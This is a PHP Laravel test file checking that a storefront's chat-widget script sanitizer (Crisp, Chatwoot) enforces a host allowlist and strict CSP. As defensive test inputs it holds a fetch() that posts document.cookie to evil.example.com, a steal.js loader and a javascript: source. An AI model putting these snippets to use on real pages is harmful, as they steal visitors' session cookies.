<?php

namespace Tests\Feature;

use App\Support\ServiceWidgetScript;
use App\Support\StorefrontConfig;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class ServiceWidgetScriptTest extends TestCase
{
    use RefreshDatabase;

    public function test_crisp_install_code_is_served_as_same_origin_javascript(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => true,
                'links' => [],
                'script' => <<<'HTML'
<script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="site-id";(function(){var d=document;var s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.head.appendChild(s);})();</script>
HTML,
            ],
        ]);

        $settings = $this->getJson('/api/settings/storefront')->assertOk();
        $settings->assertJsonPath('service_widget.script_configured', true)
            ->assertJsonMissingPath('service_widget.script');

        $response = $this->get('/api/settings/service-widget.js')->assertOk()
            ->assertHeader('Content-Type', 'application/javascript; charset=UTF-8');

        $this->assertStringContainsString('window.CRISP_WEBSITE_ID="site-id"', $response->getContent());
        $this->assertStringNotContainsString('<script', $response->getContent());
        $this->assertStringContainsString('no-store', (string) $response->headers->get('Cache-Control'));
    }

    public function test_chatwoot_origin_is_added_to_storefront_csp_without_unsafe_inline_script(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => true,
                'links' => [],
                'script' => <<<'HTML'
<script>(function(d,t){var BASE_URL="https://chat.example.com";var g=d.createElement(t);g.src=BASE_URL+"/packs/js/sdk.js";g.onload=function(){window.chatwootSDK.run({websiteToken:"token",baseUrl:BASE_URL})};d.head.appendChild(g)})(document,"script");</script>
HTML,
            ],
            // 自建 Chatwoot 域名需显式加入白名单(安全审计 M2)。
            'service_widget_allowed_hosts' => ['chat.example.com', 'client.crisp.chat'],
        ]);

        $response = $this->get('/')->assertOk();
        $csp = (string) $response->headers->get('Content-Security-Policy');

        $this->assertStringContainsString("script-src 'self' https://chat.example.com", $csp);
        $this->assertStringContainsString("frame-src 'self' https://chat.example.com", $csp);
        $this->assertStringNotContainsString("script-src 'self' 'unsafe-inline'", $csp);
    }

    public function test_external_script_tags_are_compiled_and_insecure_sources_are_ignored(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://cdn.example.com/widget.js" async></script>'
                .'<script src="javascript:alert(1)"></script>',
        ], ['cdn.example.com']);

        $this->assertStringContainsString('https://cdn.example.com/widget.js', $compiled);
        $this->assertStringContainsString('s.async=true', $compiled);
        $this->assertStringNotContainsString('javascript:', $compiled);
    }

    public function test_external_script_src_outside_allowlist_is_dropped(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://evil.example.com/steal.js"></script>',
        ]);

        $this->assertSame('', $compiled);
    }

    public function test_inline_body_referencing_disallowed_host_is_dropped(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script>fetch("https://evil.example.com/x",{method:"POST",body:document.cookie})</script>',
        ]);

        $this->assertSame('', $compiled);
    }

    public function test_inline_body_with_http_url_is_dropped(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script>var s=document.createElement("script");s.src="http://insecure.example.com/a.js"</script>',
        ], ['insecure.example.com']);

        $this->assertSame('', $compiled);
    }

    public function test_disabled_widget_returns_empty_script_and_does_not_relax_csp(): void
    {
        StorefrontConfig::setMany([
            'service_widget' => [
                'enabled' => false,
                'links' => [],
                'script' => '<script src="https://client.crisp.chat/l.js"></script>',
            ],
        ]);

        $this->get('/api/settings/service-widget.js')->assertOk()->assertContent('');

        $csp = (string) $this->get('/')->assertOk()->headers->get('Content-Security-Policy');
        $this->assertStringNotContainsString('client.crisp.chat', $csp);
    }

    public function test_chatwoot_official_snippet_compiles_with_default_hosts(): void
    {
        $widget = [
            'enabled' => true,
            'script' => <<<'HTML'
<script>
(function(d,t){var BASE_URL="https://app.chatwoot.com";var g=d.createElement(t),s=d.getElementsByTagName(t)[0];g.src=BASE_URL+"/packs/js/sdk.js";g.defer=true;g.async=true;g.onload=function(){window.chatwootSDK.run({websiteToken:'token',baseUrl:BASE_URL})};s.parentNode.insertBefore(g,s);})(document,"script");
</script>
HTML,
        ];

        $compiled = ServiceWidgetScript::compile($widget, null);
        $this->assertStringContainsString('chatwootSDK', $compiled);
    }

    public function test_dot_joined_hosts_and_stray_tokens_are_normalized(): void
    {
        // 用户误填:多个域名被点号连成一段 + 尾随逗号和残token('s')
        $raw = 'app.chatwoot.com.cdn.chatwoot.com.client.crisp.chat,s';

        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://app.chatwoot.com/packs/js/sdk.js"></script>',
        ], $raw);

        // 规范化后 app.chatwoot.com 被正确识别,脚本正常编译
        $this->assertStringContainsString('app.chatwoot.com/packs/js/sdk.js', $compiled);
    }

    public function test_whitespace_and_semicolon_separators_are_supported(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://client.crisp.chat/l.js"></script>',
        ], "app.chatwoot.com; client.crisp.chat\ncdn.chatwoot.com");

        $this->assertStringContainsString('client.crisp.chat/l.js', $compiled);
    }

    public function test_scheme_and_path_are_stripped_from_allowlist_entries(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://app.chatwoot.com/packs/js/sdk.js"></script>',
        ], 'https://app.chatwoot.com/, https://cdn.chatwoot.com/some/path');

        $this->assertStringContainsString('app.chatwoot.com/packs/js/sdk.js', $compiled);
    }

    public function test_all_invalid_entries_fall_back_to_defaults(): void
    {
        $compiled = ServiceWidgetScript::compile([
            'enabled' => true,
            'script' => '<script src="https://client.crisp.chat/l.js"></script>',
        ], 's, , 123, ,');

        // 非法条目全部剔除 → 回退默认官方域名 → crisp 正常编译
        $this->assertStringContainsString('client.crisp.chat/l.js', $compiled);
    }
}
